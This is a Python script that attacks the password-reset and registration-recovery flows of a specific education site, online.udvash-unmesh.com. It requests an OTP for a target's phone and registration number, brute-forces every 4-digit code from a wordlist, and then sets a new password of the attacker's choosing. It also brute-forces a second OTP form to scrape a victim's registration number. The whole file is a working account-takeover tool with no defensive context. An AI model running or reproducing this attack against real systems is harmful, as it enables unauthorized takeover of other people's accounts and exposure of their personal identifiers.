import requests as r
from time import sleep
from bs4 import BeautifulSoup

session = r.Session()
url = "https://online.udvash-unmesh.com/Account/ForgotPassword"
res = session.get(url)
cookie = res.headers["set-cookie"]
index = cookie.index(";") 
token = cookie[0:index]


data = {
        "__RequestVerificationToken=": token[27:] 
    }

class ChangePassword:
    
    def __init__(self,Phone,Registration):
        self.PhoneNumber = Phone
        self.registrationNumber = Registration 
    
    
     
    def req_otp(self):
        req_url = f"{url}?{token}&registrationNumber={self.registrationNumber}&mobileNumber={self.PhoneNumber}"
        session.get(req_url)
        #print(req_url)
        print("OTP sent!")


    def crack_otp(self):
        data["RegistrationNumber"] = self.registrationNumber
        data["mobileNumber"] = self.PhoneNumber
        print("trying all 10000 combination!")
        sleep(3)
        otp_url = "https://online.udvash-unmesh.com/Account/ForgotPassword"
        with open("4digits.txt") as file:
            for otp in file:
                data["otp"] = otp[0:4]
                print(data["otp"])
                otp_res = session.post(otp_url,data=data)
                if "Password length must be greater than or equal to 6" in otp_res.text:
                    print("Cracked!!")
                    break
           
               


    def changePass(self,password):
        data["NewPassword"]=password
        data["ConfirmPassword"]=password
        pass_res = session.post("https://online.udvash-unmesh.com/Account/SetNewPassword",data=data)
        if "CONGRATULATIONS!" in pass_res.text:
            print("password changed")
            print("New password:",password)
        else:
            print(pass_res)



class getRegNumber:
    def __init__(self,phone,nickName):
        self.phoneNumber = phone
        self.nickName = nickName


    def req_otp(self):
        otp_url = f"https://online.udvash-unmesh.com/Account/ForgotRegistrationNumber?{token}&mobileNumber={self.phoneNumber}&nickName={self.nickName}"
        session.get(otp_url)
        print("OTP sent!")
    
    def crack_otp(self):
        print("Preparing Bruteforce")
        sleep(3)
        data["nickName"] = self.nickName
        data["mobileNumber"] = self.phoneNumber
        otp_url = "https://online.udvash-unmesh.com/Account/ForgotRegistrationNumber"
        with open("4digits.txt") as file:
            for otp in file:
                data["otp"] = otp[0:4]
                print(data["otp"])
                otp_res = session.post(otp_url,data = data)
                if "Your registration number" in otp_res.text:
                    print("Cracked!!")
                    soup = BeautifulSoup(otp_res.content, 'html.parser')
                    h3_tag = soup.find('h3', {'class': 'uu-login-form-sub-title'})
                    span_tag = h3_tag.find('span')
                    print(f"The registration number is:{span_tag.text}")
                    break
